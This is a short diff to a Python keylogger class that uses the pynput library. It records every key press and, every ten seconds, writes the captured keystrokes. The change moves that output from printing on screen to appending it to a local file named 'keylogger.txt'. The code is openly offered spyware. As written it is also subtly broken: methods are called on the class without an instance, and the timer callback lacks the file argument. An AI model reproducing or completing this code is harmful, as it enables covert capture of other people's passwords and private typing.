@@ -1,8 +1,9 @@
 import pynput.keyboard
 import threading
 
+
 class Keylogger:
-    def process_keys(self,key):
+    def process_keys(self, key):
         global keys
         try:
             keys = keys + str(key.char)
@@ -22,15 +23,16 @@ class Keylogger:
             else:
                 keys = keys + " " + str(key) + " "
 
-    def report(self):
+    def report(self, file):
         global keys
-        print(keys)
+        file.write(keys)
         keys = ""
-        timer = threading.Timer(10,Keylogger.report)
+        timer = threading.Timer(10, Keylogger.report)
         timer.start()
 
     def main(self):
         listener = pynput.keyboard.Listener(on_press=Keylogger.process_keys)
         with listener:
-            Keylogger.report()
-            listener.join()
+            with open("keylogger.txt", "a") as file:
+                Keylogger.report(file)
+                listener.join()
